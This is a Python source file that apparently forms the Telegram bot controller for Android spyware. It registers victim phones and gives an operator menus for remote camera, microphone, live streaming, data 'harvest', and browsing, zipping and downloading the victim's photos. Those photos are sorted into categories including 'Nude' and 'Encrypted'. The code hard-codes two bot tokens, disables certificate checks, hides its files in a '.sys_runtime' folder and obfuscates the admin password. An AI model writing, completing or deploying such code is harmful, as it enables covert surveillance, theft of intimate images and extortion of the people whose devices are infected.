# -*- coding: utf-8 -*-

import os, time, json, random, threading, logging, requests

from datetime import datetime

P = os.path.join(os.getcwd(), ".sys_runtime")

if not os.path.exists(P): os.makedirs(P)

logging.basicConfig(filename=os.path.join(P, "t.log"), level=logging.ERROR)

class T:

    def __init__(self, m):

        self.m = m

        self.cf = os.path.join(P, "tcfg.json")

        self.df = os.path.join(P, "dvs.json")

        self.sf = os.path.join(P, "ses.json")

        self.adf = os.path.join(P, "admins.json")

        self.sel = {}  # {did_type_page: {selected_indices}}

        self.ses = {}

        self.dvs = {}

        self.admins = {}

        self.act = []

        self.cur = 0

        self.cmd = None

        self.dat = None

        self.rn = True

        self._l()

    def _l(self):

        if os.path.exists(self.cf):

            try:

                with open(self.cf,'r') as f:

                    c=json.load(f)

                    self.act=c.get('a',[])[:6]

                    self.cmd=c.get('c')

                    self.dat=c.get('d')

            except: pass

        if not self.act:

            self.act = ["7989685602:AAFRAWYihFV3Vx6XOUJyjcTOZYo8cT5DPJQ",

                        "8714272356:AAGgjqISJZREi2UUmZ53cpJxURhD1soFOUk"][:6]

        if os.path.exists(self.df):

            try:

                with open(self.df,'r') as f: self.dvs=json.load(f)

            except: pass

        if os.path.exists(self.sf):

            try:

                with open(self.sf,'r') as f: self.ses=json.load(f)

            except: pass

        if os.path.exists(self.adf):

            try:

                with open(self.adf,'r') as f: self.admins=json.load(f)

            except: pass

    def _s(self):

        with open(self.df,'w') as f: json.dump(self.dvs,f)

        with open(self.sf,'w') as f: json.dump(self.ses,f)

        with open(self.adf,'w') as f: json.dump(self.admins,f)

    def _tk(self):

        return self.act[self.cur % len(self.act)] if self.act else None

    def _ap(self, m, p=None, fl=None):

        t=self._tk()

        if not t: return None

        try:

            u=f"https://api.telegram.org/bot{t}/{m}"

            r=requests.post(u, data=p, files=fl, timeout=20, verify=False)

            j=r.json()

            if not j.get('ok') and j.get('error_code')==429:

                self.cur=(self.cur+1)%len(self.act)

            return j

        except: return None

    def reg(self, did, mod):

        if did in self.dvs: return self.dvs[did].get('t')

        if not self.cmd: return None

        r=self._ap("createForumTopic", {"chat_id":self.cmd, "name":f"📱 {mod[:12]} [{did[:4]}]"})

        if r and r.get('ok'):

            tid=r['result']['message_thread_id']

            self.dvs[did]={"n":mod,"t":tid}

            self._s()

            self._ap("sendMessage", {"chat_id":self.cmd, "message_thread_id":tid, "text":f"<b>✅ Connected:</b> <code>{mod}</code>\n<b>ID:</b> <code>{did}</code>", "parse_mode":"HTML"})

            return tid

        return None

    def _add_admin(self, cid, code):

        self.admins[str(code)] = {"cid": cid, "added": time.time()}

        self._s()

    def _del_admin(self, code):

        if code in self.admins:

            del self.admins[code]

            self._s()

            return True

        return False

    def _get_sel_key(self, did, mtype, page):

        return f"{did}_{mtype}_{page}"

    def _clear_sel(self, did, mtype, page):

        key = self._get_sel_key(did, mtype, page)

        if key in self.sel: del self.sel[key]

    def _toggle_sel(self, did, mtype, page, idx):

        key = self._get_sel_key(did, mtype, page)

        if key not in self.sel: self.sel[key] = set()

        if idx in self.sel[key]:

            self.sel[key].discard(idx)

        else:

            self.sel[key].add(idx)

        return len(self.sel[key])

    def _select_all(self, did, mtype, page, total):

        key = self._get_sel_key(did, mtype, page)

        self.sel[key] = set(range(1, total+1))

        return len(self.sel[key])

    def _deselect_all(self, did, mtype, page):

        key = self._get_sel_key(did, mtype, page)

        self.sel[key] = set()

        return 0

    def _kb_main(self):

        return {"inline_keyboard":[[{"text":"📱 Devices","callback_data":"ld"}],[{"text":"👥 Admins","callback_data":"la"}],[{"text":"🔄 Renew","callback_data":"rnw"},{"text":"🚪 Exit","callback_data":"ext"}]]}

    def _kb_dev(self, did):

        # القائمة الفرعية للجهاز مع أزرار أنواع الوسائط (سيتم جلب المجاميع من المونيتور لاحقاً)

        # هنا نضع أزرار ثابتة، والمجاميع ستحدث عبر كولباك أو سيتم إرسالها مع النص

        return {"inline_keyboard":[

            [{"text":"📸 Cam","callback_data":f"cam_{did}"},{"text":"🎤 Mic","callback_data":f"mic_{did}"}],

            [{"text":"🖼 Media Types","callback_data":"noop"}],  # فاصل

            [{"text":"📷 Normal","callback_data":f"mt_{did}_normal_1"},

             {"text":"🔞 Nude","callback_data":f"mt_{did}_nude_1"}],

            [{"text":"🎥 Video","callback_data":f"mt_{did}_video_1"},

             {"text":"⭕ Encrypted","callback_data":f"mt_{did}_enc_1"}],

            [{"text":"🔥📦 Harvest","callback_data":f"hrv_{did}"}],

            [{"text":"📡 Stream","callback_data":f"str_{did}"},{"text":"⚙️ Set","callback_data":f"set_{did}"}],

            [{"text":"🔙 Back","callback_data":"main"}]

        ]}

    def _kb_media_grid(self, did, mtype, page, total_pages, current_page, items_per_page=16):

        start = (current_page-1)*items_per_page + 1

        end = min(current_page*items_per_page, 999)  # سيتم تحديد العدد الفعلي من المونيتور

        bt=[]

        for i in range(0,16,4):

            row=[]

            for j in range(i+1,i+5):

                num = start + j -1

                if num <= end:

                    row.append({"text":f"📄 {num}","callback_data":f"media_{did}_{mtype}_{current_page}_{num}"})

                else:

                    row.append({"text":"⬜","callback_data":"noop"})

            bt.append(row)

        nav=[]

        if current_page>1:

            nav.append({"text":"⏮️ Prev","callback_data":f"mt_{did}_{mtype}_{current_page-1}"})

        if current_page<total_pages:

            nav.append({"text":"⏭️ Next","callback_data":f"mt_{did}_{mtype}_{current_page+1}"})

        bt.append(nav)

        bt.append([{"text":"☑️ Select All","callback_data":f"selall_{did}_{mtype}_{current_page}"},

                   {"text":"❌ Deselect All","callback_data":f"deselall_{did}_{mtype}_{current_page}"}])

        bt.append([{"text":"📦 Zip Selected","callback_data":f"zipsel_{did}_{mtype}_{current_page}"},

                   {"text":"🔙 Back","callback_data":f"dev_{did}"}])

        return {"inline_keyboard":bt}

    def _kb_media_actions(self, did, mtype, page, idx):

        return {"inline_keyboard":[

            [{"text":"👁 Preview","callback_data":f"prev_{did}_{mtype}_{page}_{idx}"},

             {"text":"✅ Select","callback_data":f"sel_{did}_{mtype}_{page}_{idx}"}],

            [{"text":"ℹ️ Info","callback_data":f"info_{did}_{mtype}_{page}_{idx}"},

             {"text":"⬇️ Download","callback_data":f"down_{did}_{mtype}_{page}_{idx}"}],

            [{"text":"🔙 Back to Grid","callback_data":f"mt_{did}_{mtype}_{page}"}]

        ]}

    def _kb_admins(self):

        bt=[]

        for code, info in self.admins.items():

            bt.append([{"text":f"🆔 {code[:6]}", "callback_data":f"adm_{code}"}])

        bt.append([{"text":"🔙 Back","callback_data":"main"}])

        return {"inline_keyboard":bt}

    def _kb_admin_delete(self, code):

        return {"inline_keyboard":[[{"text":"❌ Confirm Delete","callback_data":f"deladm_{code}"},{"text":"🔙 Back","callback_data":"la"}]]}

    def _auth(self, cid):

        e=self.ses.get(str(cid),0)

        return time.time()<e

    def _proc_m(self, u):

        m=u.get('message',{})

        cid=m.get('chat',{}).get('id')

        txt=m.get('text','')

        from monitor import _

        if txt==f"/start {_()}":

            self.ses[str(cid)]=time.time()+600

            code = hex(random.randint(100000, 999999))[2:]

            self._add_admin(cid, code)

            self._ap("sendMessage", {"chat_id":cid, "text":f"✅ Session active 10 min\n🆔 Admin code: <code>{code}</code>","reply_markup":json.dumps(self._kb_main()), "parse_mode":"HTML"})

            return

        if not self._auth(cid): return

        if txt=="/menu":

            self._ap("sendMessage", {"chat_id":cid, "text":"📋 Main Menu","reply_markup":json.dumps(self._kb_main())})

    def _proc_c(self, u):

        cb=u.get('callback_query',{})

        cid=cb.get('message',{}).get('chat',{}).get('id')

        mid=cb.get('message',{}).get('message_id')

        d=cb.get('data','')

        if not self._auth(cid):

            self._ap("answerCallbackQuery", {"callback_query_id":cb['id'],"text":"Session expired","show_alert":True})

            return

        if d.startswith("mt_"):

            # mt_did_mtype_page

            parts=d.split("_")

            if len(parts)>=4:

                did, mtype, page = parts[1], parts[2], int(parts[3])

                # طلب من المونيتور الحصول على إجمالي عدد الوسائط من هذا النوع للجهاز الحالي

                # سنرسل كولباك للمونيتور ليرد بعدد الصفحات والأرقام الفعلية

                if self.m and getattr(self.m,'cb_media_grid',None):

                    self.m.cb_media_grid(did, mtype, page, cid, mid)

                else:

                    # مؤقت: عرض شبكة وهمية

                    self._ap("editMessageText", {"chat_id":cid,"message_id":mid,"text":f"Media browser for {did} type {mtype} page {page} (mock)","reply_markup":json.dumps(self._kb_media_grid(did,mtype,page,1,1))})

            return

        if d.startswith("media_"):

            # media_did_mtype_page_idx

            parts=d.split("_")

            if len(parts)>=5:

                did, mtype, page, idx = parts[1], parts[2], int(parts[3]), parts[4]

                self._ap("editMessageText", {"chat_id":cid,"message_id":mid,"text":f"Item {idx} options","reply_markup":json.dumps(self._kb_media_actions(did,mtype,page,idx))})

            return

        if d.startswith("sel_"):

            # sel_did_mtype_page_idx

            parts=d.split("_")

            if len(parts)>=5:

                did, mtype, page, idx = parts[1], parts[2], int(parts[3]), parts[4]

                count = self._toggle_sel(did, mtype, page, idx)

                self._ap("answerCallbackQuery", {"callback_query_id":cb['id'],"text":f"Selected {count} items"})

                # العودة إلى الشبكة مع تحديث

                if self.m and getattr(self.m,'cb_media_grid',None):

                    self.m.cb_media_grid(did, mtype, page, cid, mid)

            return

        if d.startswith("selall_"):

            parts=d.split("_")

            if len(parts)>=4:

                did, mtype, page = parts[1], parts[2], int(parts[3])

                # نحتاج معرفة العدد الإجمالي للعناصر في هذه الصفحة (يجب جلبه من المونيتور)

                # سنفترض 16 مؤقتاً

                count = self._select_all(did, mtype, page, 16)

                self._ap("answerCallbackQuery", {"callback_query_id":cb['id'],"text":f"Selected all {count}"})

                if self.m and getattr(self.m,'cb_media_grid',None):

                    self.m.cb_media_grid(did, mtype, page, cid, mid)

            return

        if d.startswith("deselall_"):

            parts=d.split("_")

            if len(parts)>=4:

                did, mtype, page = parts[1], parts[2], int(parts[3])

                self._deselect_all(did, mtype, page)

                self._ap("answerCallbackQuery", {"callback_query_id":cb['id'],"text":"All deselected"})

                if self.m and getattr(self.m,'cb_media_grid',None):

                    self.m.cb_media_grid(did, mtype, page, cid, mid)

            return

        if d.startswith("zipsel_"):

            parts=d.split("_")

            if len(parts)>=4:

                did, mtype, page = parts[1], parts[2], int(parts[3])

                key = self._get_sel_key(did, mtype, page)

                selected = list(self.sel.get(key, set()))

                if not selected:

                    self._ap("answerCallbackQuery", {"callback_query_id":cb['id'],"text":"No items selected","show_alert":True})

                    return

                # إرسال طلب ضغط المحدد إلى المونيتور

                if self.m and getattr(self.m,'cb_zip_selected',None):

                    self.m.cb_zip_selected(did, mtype, page, selected, self.dat)

                self._ap("answerCallbackQuery", {"callback_query_id":cb['id'],"text":"Zipping and sending..."})

            return

        if d.startswith("prev_") or d.startswith("info_") or d.startswith("down_"):

            # تمرير هذه الأوامر إلى المونيتور لتنفيذها

            if self.m and getattr(self.m,'cb_media_action',None):

                self.m.cb_media_action(d, self.dat)

            self._ap("answerCallbackQuery", {"callback_query_id":cb['id'],"text":"Processing..."})

            return

        # باقي الأوامر كما هي (main, ld, la, adm, deladm, rnw, ext, dev_, gal_, cam_, mic_, hrv_, str_, set_)

        if d=="main":

            self._ap("editMessageText", {"chat_id":cid,"message_id":mid,"text":"📋 Main Menu","reply_markup":json.dumps(self._kb_main())})

        elif d=="ld":

            kb={"inline_keyboard":[[{"text":f"📱 {v['n']}","callback_data":f"dev_{k}"}] for k,v in self.dvs.items()]+[[{"text":"🔙 Back","callback_data":"main"}]]}

            self._ap("editMessageText", {"chat_id":cid,"message_id":mid,"text":"📱 Select Device","reply_markup":json.dumps(kb)})

        elif d=="la":

            self._ap("editMessageText", {"chat_id":cid,"message_id":mid,"text":"👥 Admin list","reply_markup":json.dumps(self._kb_admins())})

        elif d.startswith("adm_"):

            code=d.split("_")[1]

            self._ap("editMessageText", {"chat_id":cid,"message_id":mid,"text":f"🆔 Admin code: <code>{code}</code>\n❓ Delete?","reply_markup":json.dumps(self._kb_admin_delete(code)), "parse_mode":"HTML"})

        elif d.startswith("deladm_"):

            code=d.split("_")[1]

            if self._del_admin(code):

                self._ap("answerCallbackQuery", {"callback_query_id":cb['id'],"text":"Admin deleted"})

                self._ap("editMessageText", {"chat_id":cid,"message_id":mid,"text":"Admin removed","reply_markup":json.dumps(self._kb_admins())})

            else:

                self._ap("answerCallbackQuery", {"callback_query_id":cb['id'],"text":"Not found","show_alert":True})

        elif d=="rnw":

            self.ses[str(cid)]=time.time()+600

            self._s()

            self._ap("answerCallbackQuery", {"callback_query_id":cb['id'],"text":"Session renewed +10min"})

        elif d=="ext":

            self.ses.pop(str(cid),None)

            self._s()

            self._ap("editMessageText", {"chat_id":cid,"message_id":mid,"text":"Logged out"})

        elif d.startswith("dev_"):

            did=d.split("_")[1]

            self._ap("editMessageText", {"chat_id":cid,"message_id":mid,"text":f"🕹 Control: {self.dvs[did]['n']}","reply_markup":json.dumps(self._kb_dev(did))})

        elif d.startswith("cam_") or d.startswith("mic_") or d.startswith("hrv_") or d.startswith("str_") or d.startswith("set_"):

            if self.m and getattr(self.m,'cb_h',None):

                self.m.cb_h(d)

        self._ap("answerCallbackQuery", {"callback_query_id":cb['id']})

    def _pl(self):

        off=0

        while self.rn:

            r=self._ap("getUpdates", {"offset":off,"timeout":30})

            if r and r.get('ok'):

                for u in r.get('result',[]):

                    off=u['update_id']+1

                    if 'message' in u: self._proc_m(u)

                    if 'callback_query' in u: self._proc_c(u)

            time.sleep(1)

    def start(self):

        threading.Thread(target=self._pl, daemon=True).start()

def _():

    return "".join([chr(x) for x in [90,97,101,110,49,50,51,64,49,50,51,64,49,50,51]])
